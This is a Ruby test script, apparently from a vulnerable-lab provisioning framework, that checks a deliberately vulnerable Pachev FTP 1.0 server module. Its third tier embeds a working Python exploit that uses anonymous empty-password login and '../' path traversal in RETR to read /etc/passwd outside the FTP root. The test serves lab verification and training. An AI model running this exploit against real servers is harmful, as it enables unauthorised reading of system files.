require_relative '../../../../../lib/post_provision_test'

# The server binds 127.0.0.1:2121; an iptables DNAT rule (applied when the
# network comes up) forwards the module's port to it. Locally generated
# traffic skips PREROUTING, so the guest-side checks talk to 2121 directly.
class PachevFtpServer1PathTraversalTest < PostProvisionTest
  def initialize
    self.module_name = 'pachev_ftp_server_1_path_traversal'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    release_dir = '/opt/pachev_ftp/pachev_ftp-master/ftp_server/target/release'
    tier(1) do
      # Pachev FTP server is built offline from the vendored crates with Cargo
      test_command_succeeds('ftp_server binary built', "test -x #{release_dir}/ftp_server")
      test_command_succeeds('pachevftp service file present', 'test -f /etc/systemd/system/pachevftp.service')
    end
    tier(2) do
      test_command_succeeds('pachevftp service active', 'systemctl is-active pachevftp')
      test_service_up(port: 2121)
      test_banner('Welcome', port: 2121)
      test_local_command("port #{port} redirected to 2121", 'iptables -t nat -S PREROUTING', '127.0.0.1:2121')
    end
    tier(3) do
      # EDB 47956: Pachev FTP 1.0 doesn't confine a session to its FTP root. retr_file
      # opens cur_dir + '/' + <RETR arg> with no sanitisation, so a '../' path escapes
      # the root. Prove it from the attacker VM by reading world-readable /etc/passwd
      # (a benign PoC: no secret is exfiltrated, and a server that confined the session
      # would deny it). Credential-free: 'anonymous' has an empty password (the server
      # splits users.cfg on a single space, so "anonymous   user" yields pass=""), and
      # ftplib.login() would rewrite an empty anonymous password to 'anonymous@', so we
      # send USER/PASS directly. The config is ACTIVE-only, so ftplib uses PORT
      # (set_pasv(False)); the listener binds loopback, reached on the module port via
      # the iptables DNAT, so we connect to self.port (not the internal 2121).
      name = 'anonymous path traversal reads a file outside the FTP root (from attacker VM)'
      resolved = resolve_attacker(name, nil, nil, 3)
      if resolved
        attacker, _attacker_ip, rhost = resolved
        exploit = <<~'PY'
          import ftplib, sys
          host = sys.argv[1]
          port = int(sys.argv[2])
          def session():
              f = ftplib.FTP(); f.connect(host, port, timeout=8)
              f.set_pasv(False)               # server config is ACTIVE-only -> PORT
              f.sendcmd('USER anonymous')      # 331
              f.sendcmd('PASS')                # empty password -> 230
              return f
          try:
              f = session()
              print('login OK: anonymous (empty password)')
              try: f.quit()
              except Exception: f.close()
          except Exception as e:
              print('anonymous login failed: %r' % e); print('SECGEN_LOGIN_FAIL'); sys.exit(2)
          # cur_dir is deep under /, so enough '..' reach the root; extra '..' at /
          # are harmless. Missing intermediate files make the server error, so try a
          # few depths and stop at the first that returns /etc/passwd.
          for depth in [10, 11, 9, 12, 8, 13]:
              trav = '../' * depth + 'etc/passwd'
              try:
                  f = session(); buf = []
                  f.retrbinary('RETR ' + trav, buf.append)
                  try: f.quit()
                  except Exception: f.close()
                  data = b''.join(buf).decode('utf-8', 'replace')
                  if 'root:' in data and ':0:0:' in data:
                      print('SECGEN_TRAVERSAL_OK payload=%s' % trav); print(data); sys.exit(0)
              except Exception as e:
                  print('RETR depth=%d: %r' % (depth, e))
                  try: f.close()
                  except Exception: pass
          print('SECGEN_TRAVERSAL_FAIL'); sys.exit(1)
        PY
        cmd = "command -v python3 >/dev/null || { echo SECGEN_NO_PYTHON3; exit 3; }\n" \
              "python3 - #{Shellwords.escape(rhost)} #{Shellwords.escape(self.port.to_s)} <<'PY'\n#{exploit}PY"
        res = run_on_system(attacker, cmd, timeout: 180)
        out = "#{res[:stdout]}\n#{res[:stderr]}"
        add_evidence('ftp_traversal_output', "echo #{Shellwords.escape(out[-3000..-1] || out)}")
        if out.include?('SECGEN_TRAVERSAL_OK') && out =~ /root:.*:0:0:/
          pass_check(name,
                     "anonymous FTP login + path traversal from #{attacker} read /etc/passwd on #{rhost}: #{out[/SECGEN_(LOGIN|TRAVERSAL)_OK[^\n]*/]}",
                     tier: 3)
        else
          fail_check(name,
                     "Path traversal did not return /etc/passwd from #{rhost}; see ftp_traversal_output evidence.",
                     tier: 3)
        end
      end
    end
  end
end

PachevFtpServer1PathTraversalTest.new.run
